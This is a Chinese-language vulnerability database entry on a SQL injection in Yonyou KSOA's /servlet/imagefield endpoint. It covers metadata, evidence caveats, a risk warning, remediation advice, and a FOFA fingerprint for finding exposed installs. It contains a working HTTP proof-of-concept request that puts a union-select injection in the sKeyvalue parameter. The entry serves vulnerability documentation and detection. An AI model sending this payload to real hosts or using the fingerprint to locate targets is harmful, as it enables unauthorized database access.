---
source: "https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-ksoa-servletimagefield-skeyvalue-sqli.yaml"
title: "用友时空KSOA imagefield sKeyvalue SQL 注入"
product: "用友时空KSOA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知"
prerequisites: "无Cookie片段，真实认证未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E6%97%B6%E7%A9%BAKSOA%20servletimagefield%20sKeyvalue%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"用友-时空KSOA\""
category_recommendation: "ERP / 用友 KSOA"
id: "vw-871357ea3694def383ff6093"
entity_id: "ve-871357ea3694def383ff6093"
schema_version: "1"
source_url: "https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-ksoa-servletimagefield-skeyvalue-sqli.yaml"
---

# 用友时空KSOA imagefield sKeyvalue SQL 注入

## 条目说明

- 对象与具体问题：用友时空KSOA；imagefield sKeyvalue SQLi
- 版本、配置及部署条件：未知
- 认证与权限前提：无Cookie片段，真实认证未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 固定PoC及常量MD5完整值说明清楚，短匹配0x098f6bc仍需核查询输出
- 参数sTablename=bbs_admin涉及表存在前提，即使取常量也未必完全不依赖该表
- 缺修复build及根因

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

用友时空 KSOA 的 `/servlet/imagefield` 接口通过 `sKeyvalue` 等参数组织查询。公开 PoC 在 `sKeyvalue` 中使用联合查询回显固定字符串的 MD5，用于识别 SQL 注入；数据库数据的可访问范围仍取决于应用账户权限。

### 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

### 公开验证方法

```http
GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
Host: example.invalid
```

原始 afrog 模板检查 200 状态码及响应中的 `0x098f6bc`。人工核对应确认该值来自查询结果而非请求反射或错误页；完整 MD5 为 `098f6bcd4621d373cade4e832627b4f6`。此请求只计算常量，不需要读取真实用户数据。本文仅核对公开源码，未进行本地复现。

### 修复建议

向用友获取适用于当前版本的安全更新。修复时在对应数据库查询处使用参数化语句，并以最小权限数据库账户运行；修复后复核同一参数的正常请求与异常输入。

### 参考链接

- [zan8in/afrog-pocs 原始 PoC（固定提交）](https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-ksoa-servletimagefield-skeyvalue-sqli.yaml)

### 网络测绘

```text
app="用友-时空KSOA"
```
